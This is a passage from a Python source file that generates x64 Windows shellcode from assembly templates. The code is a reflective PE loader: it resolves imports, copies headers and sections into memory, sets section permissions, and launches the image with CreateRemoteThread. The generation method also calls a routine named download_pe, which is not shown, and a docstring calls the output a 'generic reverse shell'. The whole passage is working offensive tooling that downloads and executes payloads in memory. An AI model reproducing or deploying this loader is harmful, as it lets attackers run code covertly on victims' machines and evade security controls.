    mov rcx, [r15 + {self.storage_offsets['hLibraryHandle']}]
    mov rax, [r15 + {self.storage_offsets['GetProcAddress']}]
    call rax 

write_address:
    mov rdx, [r15 + {self.storage_offsets['dwFThunk']}]
    add rdx, {self.struct_def_IMAGE_THUNK_DATA['AddressOfData']}
    mov [rdx], rax 

load_next_entry:
    mov rdx, [r15 + {self.storage_offsets['dwFThunk']}]
    add rdx, 0x08 
    mov [r15 + {self.storage_offsets['dwFThunk']}], rdx

check_next_done:
    mov rdx, [r15 + {self.storage_offsets['dwFThunk']}]
    add rdx, {self.struct_def_IMAGE_THUNK_DATA['Function']}
    mov rdx, [rdx]
    cmp rdx, 0x00
    jne get_lpApiImport

next_dll:
    mov rdx, [r15 + {self.storage_offsets['lpImportData']}]
    add rdx, 0x14
    mov [r15 + {self.storage_offsets['lpImportData']}], rdx

check_dll_done:
    xor r11, r11
    add rdx, {self.struct_def_IMAGE_IMPORT_DESCRIPTOR['Name']}
    mov r11d, [rdx]
    cmp r11, 0x00
    jne parse_imports
imports_loaded:
    nop
        """

        return stub

    def write_headers(self):
        stub = f"""
copy_to_alloc:
    xor r8, r8
    mov rax, [r15 + {self.storage_offsets['memcpy']}]
    mov rcx, [r15 + {self.storage_offsets['lpAllocatedBase']}]
    mov r11, [r15 + {self.storage_offsets['lpNtHeader']}]
    add r11, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
    mov r8d, [r11 + {self.struct_def_IMAGE_OPTIONAL_HEADER['SizeOfHeaders']}]
    mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
    call rax

change_permissions:
    xor rdx, rdx
    mov rcx, [r15 + {self.storage_offsets['lpAllocatedBase']}]
    mov r11, [r15 + {self.storage_offsets['lpNtHeader']}]
    add r11, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
    mov dx, [r11 + {self.struct_def_IMAGE_OPTIONAL_HEADER['SizeOfHeaders']}]
    mov rax, [r15 + {self.storage_offsets['VirtualProtect']}]
    mov r11, 0x02
    mov r8, r11 
    mov r11, 0x00
    mov [rsp+0x20], r11
    mov r11, rsp
    add r11, 0x20
    mov r9, r11
    call rax

headers_written:
    nop
        """

        return stub

    def modify_section_perms(self):

        stub = f"""
get_lpSectionHeaderArray:
    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
    add rdx, {self.struct_def_IMAGE_DOS_HEADER['e_lfanew']}
    mov r11d, [rdx]
    mov rdx, r11 
    mov rcx, [r15 + {self.storage_offsets['lpvFileContent']}]
    add rcx, rdx 
    add rcx, 0x108
    mov [r15 + {self.storage_offsets['lpSectionHeaderArray']}], rcx 

    xor rax, rax
    mov [r15 + {self.storage_offsets['dwSecIndex']}], rax
copy_section:
    mov rax, [r15 + {self.storage_offsets['dwSecIndex']}]
    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
    mov r11d, [rdx] 
    xor r14, r14
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['PointerToRawData']}
    mov r14d, [rdx] 
    xor r13, r13
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['SizeOfRawData']}
    mov r13d, [rdx] 
    ; adding now
    mov rcx, [r15 + {self.storage_offsets['lpAllocatedBase']}]
    add rcx, r11
    mov rdx, [r15 + {self.storage_offsets['lpvFileContent']}]
    add rdx, r14 
    mov r8, r13
    mov rax, [r15 + {self.storage_offsets['memcpy']}]
    call rax

get_mapped_section_size:
    xor rax, rax
    mov [r15 + {self.storage_offsets['dwSectionMappedSize']}], rax
    mov rdx, [r15 + {self.storage_offsets['lpNtHeader']}]
    add rdx, {self.struct_def_IMAGE_NT_HEADERS["FileHeader"]}
    mov ax, [rdx] 
    sub rax, 0x01
    mov rcx, [r15 + {self.storage_offsets['dwSecIndex']}]
    cmp rcx, rax
    jne next_section
last_section:
    xor rdx, rdx
    mov r11, [r15 + {self.storage_offsets['lpNtHeader']}]
    add r11, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
    mov dx, [r11 + {self.struct_def_IMAGE_OPTIONAL_HEADER['SizeOfHeaders']}] 

    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
    mov r11d, [rdx] 

    sub rdx, r11
    mov [r15 + {self.storage_offsets['dwSectionMappedSize']}], r11

next_section:
    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, 0x28 
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
    mov r11d, [rdx] 

    xor r12, r12
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
    mov r12d, [rdx] 

    sub r11, r12
    mov [r15 + {self.storage_offsets['dwSectionMappedSize']}], r11 

page_execute_read_write:

    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['Characteristics']}
    mov r11d, [rdx] 

    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_EXECUTE']}
    jz page_execute_read

    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_READ']}
    jz page_execute_read

    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_WRITE']}
    jz page_execute_read

    mov r12, {self.static_variables['PAGE_EXECUTE_READWRITE']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_execute_read:
    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_EXECUTE']}
    jz page_execute_writecopy

    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_READ']}
    jz page_execute_writecopy

    mov r12, {self.static_variables['PAGE_EXECUTE_READ']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_execute_writecopy:
    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_EXECUTE']}
    jz page_readwrite

    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_WRITE']}
    jz page_readwrite

    mov r12, {self.static_variables['PAGE_EXECUTE_WRITECOPY']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_readwrite:
    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_READ']}
    jz page_execute

    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_WRITE']}
    jz page_execute

    mov r12, {self.static_variables['PAGE_READWRITE']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_execute:
    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_EXECUTE']}
    jz page_readonly

    mov r12, {self.static_variables['PAGE_EXECUTE']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_readonly:
    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_READ']}
    jz page_writecopy

    mov r12, {self.static_variables['PAGE_READONLY']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_writecopy:
    mov r12, r11 
    and r12d, {self.static_variables['IMAGE_SCN_MEM_WRITE']}
    jz page_noaccess

    mov r12, {self.static_variables['PAGE_WRITECOPY']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_noaccess:
    mov r12, {self.static_variables['PAGE_NOACCESS']}
    mov [r15 + {self.storage_offsets['dwSectionProtection']}], r12

change_perm:
    nop
    xor r11, r11
    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {self.struct_def_IMAGE_SECTION_HEADER['VirtualAddress']}
    mov r11d, [rdx] 
    mov rdx, [r15 + {self.storage_offsets['lpAllocatedBase']}]
    add rdx, r11 
    mov rcx, rdx
    mov rdx, [r15 + {self.storage_offsets['dwSectionMappedSize']}]
    mov r8, [r15 + {self.storage_offsets['dwSectionProtection']}]
    mov r11, rsp
    add r11, 0x20
    mov r9, r11
    mov rax, [r15 + {self.storage_offsets['VirtualProtect']}]
    nop
    call rax

check_next_section:
    mov rcx, [r15 + {self.storage_offsets['dwSecIndex']}]
    add rcx, 0x01
    mov [r15 + {self.storage_offsets['dwSecIndex']}], rcx 

    mov rdx, [r15 + {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, 0x28 
    mov [r15 + {self.storage_offsets['lpSectionHeaderArray']}], rdx 

    xor r9, r9
    mov r8, [r15 + {self.storage_offsets['lpNtHeader']}]
    add r8, {self.struct_def_IMAGE_NT_HEADERS['FileHeader']}
    mov r9w, [r8 + {self.struct_def_IMAGE_FILE_HEADER['NumberOfSections']}] 

    cmp rcx, r9
    jl copy_section

perms_changed:
    nop
        """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        shellcode = f"""
_start:
    call getKernel32
    mov rdi, rax

stackAlign:
    sub rsp, 8
    mov r15, rsp
        """

        shellcode += self.resolve_functions()

        shellcode += self.download_pe()

        shellcode += self.alloc_image_space()

        shellcode += self.rebase_pe()

        shellcode += self.load_imports()

        shellcode += self.write_headers()

        shellcode += self.modify_section_perms()

        shellcode += f"""
create_rthread:
    mov rdx, 0x00
    
    mov r8, 0x00

    xor r9, r9
    mov r8, [r15 + {self.storage_offsets['pNtHeader']}]
    add r8, {self.struct_def_IMAGE_NT_HEADERS['OptionalHeader']}
    mov r9w, [r8 + {self.struct_def_IMAGE_OPTIONAL_HEADER['AddressOfEntryPoint']}]

    mov rcx, [r15 + {self.storage_offsets['lpvLoadedAddress']}]
    add rcx, r9
    mov r9, rcx

    xor r11, r11
    mov [rsp + 0x20], r11
    mov [rsp + 0x28], r11
    mov [rsp + 0x30], r11

    xor r8, r8
    mov rax, [r15 + {self.storage_offsets['CreateRemoteThread']}]
    mov rcx, [r15 + {self.storage_offsets['hProcess']}]
    call rax 

    mov rcx, rax
    xor rdx, rdx
    sub rdx, 1
    mov rax, [r15 + {self.storage_offsets['WaitForSingleObject']}]
    call rax 

        """

        shellcode += self.get_kernel32()

        shellcode += self.lookup_function()

        shellcode += self.rva_to_offset()

        return shellcode

    def get_shellcode(self):
        """Generates Windows (x64) generic reverse shell
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
